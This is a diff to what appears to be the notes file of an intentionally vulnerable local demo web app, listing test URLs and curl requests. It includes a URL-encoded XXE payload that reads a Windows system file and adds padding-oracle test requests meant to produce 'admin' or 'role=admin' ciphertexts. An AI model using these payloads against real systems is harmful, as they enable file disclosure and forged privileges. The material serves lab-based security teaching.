@@ -76,3 +76,19 @@ http://127.0.0.1:8080/actuator/beans
 http://127.0.0.1:8080/xml-vulnerable?xml=%3Ctest%3EWorld%3C/test%3E
 
 http://127.0.0.1:8080/xml-vulnerable?xml=%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20test%20SYSTEM%20%27file%3A%2F%2F%2FC%3A%5C%5CWindows%5C%5Csystem%2Eini%27%3E%5D%3E%3Croot%3E%26test%3B%3C%2Froot%3E
+
+## Padding Oracle
+
+https://www.nccgroup.com/us/research-blog/cryptopals-exploiting-cbc-padding-oracles/
+
+#### admin
+curl -X POST http://127.0.0.1:8080/encrypt-vulnerable -d "data=YWRtaW4="         
+
+curl -X POST http://127.0.0.1:8080/decrypt-vulnerable -d "data=6gnwywMp22o5Hwtu6cVd4Q=="
+
+curl -X POST http://127.0.0.1:8080/encrypt -d "data=YWRtaW4="
+
+curl -X POST http://127.0.0.1:8080/decrypt -d "data=lVJrUD21AiZ53VikvCrCfDZhYIqZWdlgnO6RtlTufBLqCfDLAynbajkfC27pxV3h"
+
+####  role=admin
+curl -X POST http://127.0.0.1:8080/encrypt-vulnerable -d "data=cm9sZT1hZG1pbg=="
